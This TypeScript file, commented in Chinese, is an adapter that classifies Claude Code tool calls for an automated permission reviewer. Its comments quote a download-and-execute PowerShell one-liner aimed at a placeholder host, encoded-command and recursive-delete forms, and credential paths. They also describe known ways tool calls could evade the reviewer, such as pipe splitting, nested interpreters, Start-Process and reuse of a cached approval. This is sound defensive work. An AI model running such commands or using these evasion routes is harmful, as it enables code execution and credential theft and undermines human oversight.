/**
 * Claude Code 的 Auto-review adapter —— 把 CC 内置工具调用翻译成归一化 `ReviewableAction`,
 * 交给 harness 无关的 Cindy Auto-Review Core(`../shared/auto-review.ts`)裁决。
 *
 * 背景与判定档见 core 的文件头。Claude 侧特有的只是"工具名→动作"的映射:CC 的
 * `--permission-mode auto` 会绕过 Cindy 的 canUseTool(实机探针证实),故 auto 映射到 SDK
 * `default` 让 canUseTool 生效后,非 MCP 内置工具在此分类(见 claude-code/index.ts 的 dispatcher)。
 */

import {
  reviewAction,
  isSensitiveCredentialPath,
  type ReviewableAction,
  type ReviewVerdict,
} from '../shared/auto-review.js';

export type BuiltinAutoReviewVerdict = ReviewVerdict;

export interface BuiltinAutoReviewContext {
  /** Claude 内置工具名(非 MCP;MCP 工具走 host 的 getMcpToolApprovalPolicy)。 */
  toolName: string;
  /** 工具入参(SDK 透传的原始对象)。 */
  input: unknown;
  /** 会话的工作区根:cwd + additionalDirectories,绝对路径。远端会话是远端路径(纯字符串判定)。 */
  workspaceRoots: string[];
  /** 会话所在平台(决定是否抹平 macOS firmlink /private)。缺省用本进程 process.platform;远端会话应传远端 OS。 */
  platform?: NodeJS.Platform;
}

/** 只读内省工具:纯读、无本地写、无命令执行、无外发。 */
const READ_ONLY_TOOLS: ReadonlySet<string> = new Set([
  'Read', 'Glob', 'Grep', 'LS', 'NotebookRead',
]);

/**
 * 无副作用的会话内状态/控制工具:TodoWrite 只改会话内 todo;BashOutput/KillShell 只读取/终止
 * 已存在(已被审过)的后台 shell;Task 派生 subagent,其内部工具调用会再次经 canUseTool 复检。
 */
const SAFE_STATEFUL_TOOLS: ReadonlySet<string> = new Set([
  'TodoWrite', 'BashOutput', 'KillShell', 'KillBash', 'Task',
]);

/** 会改文件、带结构化 path 参数、可精确判定工作区边界的工具。 */
const FILE_WRITE_TOOLS: ReadonlySet<string> = new Set([
  'Write', 'Edit', 'MultiEdit', 'NotebookEdit',
]);

/**
 * PowerShell 工具的 `command` 是**裸** PowerShell 语句(如 `Remove-Item -Recurse x`),
 * 而 core 的 `powerShellNeedsConsent` 判据要求命令以 `pwsh` / `powershell` 开头才认
 * (它服务的是 Bash 里写 `powershell -c "…"` 那种形态)。直接把裸语句当 exec 传下去,
 * POWERSHELL_DANGER_PATTERNS 一条都匹配不上 —— 红线形同虚设。
 *
 * 补上解释器前缀,让同一份判据对「PowerShell 工具」和「Bash 调 powershell」两种
 * 入口给出一致结论。用 `-Command` 是 pwsh 的规范长写法,判据按前缀名识别、不依赖
 * 具体参数拼写。
 */
function powerShellExecCommand(command: string): string {
  const trimmed = command.trim();
  if (!trimmed) return '';
  // 已经自带解释器前缀的(模型偶尔会写全,也可能经调用运算符 / 完整路径启动)不重复包装:
  // 既避免 `pwsh -c pwsh -c …`,也让 core 的 **argv 级**判据看得到解释器(见下方函数注释)。
  const nested = normalizeNestedPowerShellInvocation(trimmed);
  if (nested) return nested;
  // **必须整条加引号成为单个 token**。core 的 shellCommandPayload 取 `-Command`
  // 后的**一个** token 作为载荷,而 highImpactExecutionNeedsConsent 是逐管道段判断的:
  // 不加引号时 `pwsh -Command curl https://x/a.ps1 | iex` 会被拆成
  //   段1 `pwsh -Command curl https://x/a.ps1`   ← 载荷里没有 iex
  //   段2 `iex`                                  ← 看不到下载动词
  // 两段各自都不构成红线,于是「下载即执行」降级成灰区 prompt(greptile 报,已实测复现)。
  // 加引号后整条进同一个载荷,PowerShell 红线能同时看到下载动词与 iex。
  return `pwsh -Command ${quoteAsSingleShellToken(trimmed)}`;
}

/**
 * 把任意命令文本包成**一个** shell token,供审查判据取整条载荷。
 *
 * 只服务静态审查,不用于真实执行 —— 但仍按单引号规范转义(`'` → `'\''`),
 * 否则载荷里的引号会把 token 提前截断、又变成分段泄漏。
 */
function quoteAsSingleShellToken(text: string): string {
  return `'${text.replaceAll("'", "'\\''")}'`;
}

/**
 * 把「已经是 PowerShell 解释器调用」的形态归一成 `pwsh <原样余参>`,让解释器落在 **token 0**。
 *
 * 为什么必须归一而不能一律往外包 `-Command`:core 的 PowerShell 红线有两类,
 * 只有一类能穿透包装 ——
 *   - **文本型**(`Remove-Item -Recurse`、`iex`、`iwr … | iex`)扫的是载荷正文,
 *     包在 `-Command '…'` 里照样命中;
 *   - **argv 型**(`-EncodedCommand` / `-e` / `-enc`,base64 静态不可读 → 必问)在
 *     `powerShellNeedsConsent`(shared/auto-review.ts:2141)里要求 `tokens[0]` 就是
 *     pwsh/powershell,且逐个 argv 匹配。一旦被包进 `-Command` 的载荷,它只是载荷正文里的
 *     一串字面量,argv 扫描永远看不到 → 整条从 prompt-each-time 掉进灰区(codex 报,已实测)。
 *
 * 命中的形态:短名 / 带 `.exe` / 带完整路径 / 带引号 / 前置调用运算符(`&` 调用、`.` 点源)。
 * 归一只搬解释器位置、不改余参,所以对非编码调用(`-File`、普通 `-Command`)判档与此前一致。
 *
 * **已知残留**(均属 core 侧 tokenizer/文本判据范围,不在本 adapter 修:见 #2563):
 *   - 未加引号且含空格的完整路径(`& C:\Program Files\…\pwsh.exe -enc X`)—— 该写法本身
 *     不是合法 PowerShell,core 的 Bash 入口同样只判 prompt;
 *   - 解释器不在开头的间接启动(`Start-Process pwsh -ArgumentList '-EncodedCommand …'`)。
 */
function normalizeNestedPowerShellInvocation(command: string): string | null {
  // 调用运算符:`& <exe>` 调用、`. <exe>` 点源,两者都是启动该解释器。
  const withoutOperator = command.replace(/^[&.]\s+/, '');
  const target = leadingShellToken(withoutOperator);
  if (!target) return null;
  const bin = powerShellExecutableName(target.value);
  if (!bin) return null;
  const rest = withoutOperator.slice(target.length).trim();
  return rest ? `${bin} ${rest}` : bin;
}

/** 取开头的一个 shell token(支持单/双引号包裹的带空格路径),返回其值与在原串中占的长度。 */
function leadingShellToken(text: string): { value: string; length: number } | null {
  const quote = text[0];
  if (quote === '"' || quote === "'") {
    const end = text.indexOf(quote, 1);
    if (end < 0) return null; // 引号未闭合 → 不当作解释器调用,交给外层包装
    return { value: text.slice(1, end), length: end + 1 };
  }
  const match = /^\S+/.exec(text);
  return match ? { value: match[0], length: match[0].length } : null;
}

/**
 * token 是否为 PowerShell 解释器;是则返回**规范短名**。与 core 的 `executableName` 同口径
 * (去目录、去 `.exe`、大小写无关)。保留 pwsh / powershell 的区分,不把 5.1 与 7 混为一谈。
 */
function powerShellExecutableName(token: string): 'pwsh' | 'powershell' | null {
  const base = token.split(/[\\/]/).pop() ?? '';
  const stem = base.replace(/\.exe$/i, '').toLowerCase();
  return stem === 'pwsh' ? 'pwsh' : stem === 'powershell' ? 'powershell' : null;
}

function extractFilePath(toolName: string, input: unknown): string | undefined {
  const obj = input as Record<string, unknown> | null;
  if (!obj) return undefined;
  const key = toolName === 'NotebookEdit' ? 'notebook_path' : 'file_path';
  const v = obj[key];
  return typeof v === 'string' && v.length > 0 ? v : undefined;
}

function extractCommand(input: unknown): string {
  const c = (input as { command?: unknown } | null)?.command;
  return typeof c === 'string' ? c : '';
}

/**
 * 读工具的路径字段(Read=file_path、NotebookRead=notebook_path、Grep/Glob/LS=path),交 core 判凭证。
 * 命中凭证位置(如 ~/.ssh、/Users/x/.aws)才升级——读内容(Read/Grep)与列目录(LS/Glob)都算侦察面;
 * 路径缺失(如 `Glob {pattern}` 无 path)返回 undefined,按普通只读放行。
 */
function extractReadPath(toolName: string, input: unknown): string | undefined {
  const obj = input as Record<string, unknown> | null;
  if (!obj) return undefined;
  const primaryKey = toolName === 'Read' ? 'file_path' : toolName === 'NotebookRead' ? 'notebook_path' : 'path';
  const candidates: string[] = [];
  const push = (v: unknown): void => {
    if (typeof v === 'string' && v.length > 0) candidates.push(v);
  };
  push(obj[primaryKey]);
  // 文件选择器也可能直指凭证文件:Grep 的 glob(`{path:'/Users/me', glob:'**/.aws/credentials'}` 会读出内容)、
  // Glob 的 pattern(其本身就是路径选择器)。任一命中凭证就用它升级;Grep 的 pattern 是搜索正则、非路径,不纳入。
  if (toolName === 'Grep') push(obj.glob);
  if (toolName === 'Glob') push(obj.pattern);
  return candidates.find((c) => isSensitiveCredentialPath(c)) ?? candidates[0];
}

function extractNetworkTarget(toolName: string, input: unknown): string | undefined {
  if (!input || typeof input !== 'object' || Array.isArray(input)) return undefined;
  const obj = input as Record<string, unknown>;
  const key = toolName === 'WebFetch' ? 'url' : 'query';
  const value = obj[key];
  return typeof value === 'string' && value.trim() ? value : undefined;
}

/**
 * Auto-review 下对一个**内置工具调用**给出审查档位。仅在权限档为 `auto` 时调用
 * (见 claude-code/index.ts 的 canUseTool dispatcher)。纯映射,判定逻辑全在 core。
 */
export function classifyBuiltinToolForAutoReview(
  ctx: BuiltinAutoReviewContext,
): BuiltinAutoReviewVerdict {
  const action = normalizeBuiltinToolForAutoReview(ctx.toolName, ctx.input);
  const opts = ctx.platform ? { platform: ctx.platform } : undefined;
  return reviewAction(action, ctx.workspaceRoots, opts);
}

/** 把 Claude 内置工具翻译成共享动作；判定与 AI fallback 都复用这一份归一化结果。 */
export function normalizeBuiltinToolForAutoReview(
  toolName: string,
  input: unknown,
): ReviewableAction {
  if (READ_ONLY_TOOLS.has(toolName)) {
    // Read/NotebookRead 读单个具名文件(scope='file');Grep/Glob/LS 是目录级递归读(scope='tree'),
    // 根在工作区外时能遍历进区外凭证子路径 → 由 core 按边界升级(见 reviewAction 的 read 分支)。
    const scope: 'file' | 'tree' = toolName === 'Read' || toolName === 'NotebookRead' ? 'file' : 'tree';
    return { kind: 'read', path: extractReadPath(toolName, input), scope };
  }
  if (SAFE_STATEFUL_TOOLS.has(toolName)) return { kind: 'session-state' };
  if (FILE_WRITE_TOOLS.has(toolName)) {
    return { kind: 'file-write', path: extractFilePath(toolName, input) };
  }
  // Bash / PowerShell 都是「跑一段命令文本」,判据完全相同 —— 归一到 exec 让
  // classifyShellCommand 的红线(含 POWERSHELL_DANGER_PATTERNS)真正生效。
  // 漏掉 PowerShell 的后果不是「少审一个工具」而是**静默拒绝**:它会落到下面
  // 的兜底 other,而无 description 的 other 在 missingReviewEvidence 处直接
  // block、连模型都不问 —— Windows 用户在 Auto 档下用 PowerShell 是坏的。
  if (toolName === 'Bash') {
    return { kind: 'exec', command: extractCommand(input) };
  }
  if (toolName === 'PowerShell') {
    return { kind: 'exec', command: powerShellExecCommand(extractCommand(input)) };
  }
  // WebFetch/WebSearch:把 URL/搜索词送往外部(exfil 面)→ 升级。
  if (toolName === 'WebFetch' || toolName === 'WebSearch') {
    return {
      kind: 'network',
      operation: toolName,
      target: extractNetworkTarget(toolName, input),
    };
  }
  // 未知 / 其它一切工具 → 升级给审阅器裁决。
  //
  // **必须带 description**:裸 `{ kind: 'other' }` 会在 missingReviewEvidence
  // (shared/auto-review-decision.ts)被判为「证据不足」→ 在调模型**之前**直接
  // block。那不是「fail-closed 升级」而是静默拒绝:用户既看不到卡也没有理由,
  // 而 SDK 每加一个内置工具就会复发一次(实测 PowerShell 已中)。
  return { kind: 'other', description: describeUnknownTool(toolName, input) };
}

/**
 * 未映射工具的审查证据。三个约束同时成立,少一个就会出问题:
 *
 * 1. **非空** —— 否则 missingReviewEvidence 在调模型前直接 block(静默拒绝)。
 * 2. **不泄漏入参内容** —— description 会进 reviewer prompt,入参可能是文件正文、
 *    凭证或用户数据。所以只带**键名**与值的**形状**,绝不带值本身。
 * 3. **逐调用可区分** —— reviewAutoAction 的缓存键是整个 request 的序列化
 *    (claude-code/index.ts:2009)。只带工具名会让同一工具的所有调用共享一个键,
 *    于是「先一次无害调用拿到 allow、后续任意参数复用该 allow」(codex 报)。
 *    带上入参指纹让不同参数各自成键。
 *
 * 指纹用长度 + 字符和,不可逆(拿不回原文)但对内容变化敏感 —— 目的只是分桶,
 * 不是密码学承诺。真正的安全判断由审阅器基于键名与形状做。
 */
function describeUnknownTool(toolName: string, input: unknown): string {
  const shape = describeInputShape(input);
  return `Claude Code built-in tool "${toolName}" (not individually classified by Cindy). `
    + `Arguments withheld; structure only: ${shape}`;
}

/** 入参的键名与值形状(不含值本身),外加一个内容指纹用于逐调用分桶。 */
function describeInputShape(input: unknown): string {
  if (input === null || input === undefined) return 'none';
  if (typeof input !== 'object' || Array.isArray(input)) {
    return `${Array.isArray(input) ? 'array' : typeof input}#${contentFingerprint(input)}`;
  }
  const entries = Object.entries(input as Record<string, unknown>)
    .map(([key, value]) => `${key}:${valueShape(value)}`)
    .sort();
  const shape = entries.length > 0 ? `{${entries.join(', ')}}` : '{}';
  return `${shape}#${contentFingerprint(input)}`;
}

/** 值的形状:类型 + 规模。字符串只报长度,不报内容。 */
function valueShape(value: unknown): string {
  if (value === null) return 'null';
  if (Array.isArray(value)) return `array(${value.length})`;
  switch (typeof value) {
    case 'string': return `string(${value.length})`;
    case 'object': return `object(${Object.keys(value as object).length})`;
    default: return typeof value;
  }
}

/**
 * 内容指纹:让「同一工具、不同入参」落到不同缓存键。
 *
 * 单向且有损(长度 + 加权字符和 → 8 位十六进制),从指纹拿不回原文;它只需要做到
 * 「入参变了指纹极可能也变」,不需要抗碰撞 —— 碰撞的后果是两次调用共享一次审查,
 * 与本次修复前「所有调用共享一次」相比仍是严格收紧。
 */
function contentFingerprint(value: unknown): string {
  let serialized: string;
  try {
    serialized = JSON.stringify(value) ?? String(value);
  } catch {
    // 循环引用等不可序列化入参:退化成类型标记,仍比完全无区分好。
    return 'unserializable';
  }
  let hash = 0x811c9dc5;
  for (let i = 0; i < serialized.length; i++) {
    hash ^= serialized.charCodeAt(i);
    hash = Math.imul(hash, 0x01000193) >>> 0;
  }
  return `${serialized.length.toString(16)}-${hash.toString(16).padStart(8, '0')}`;
}
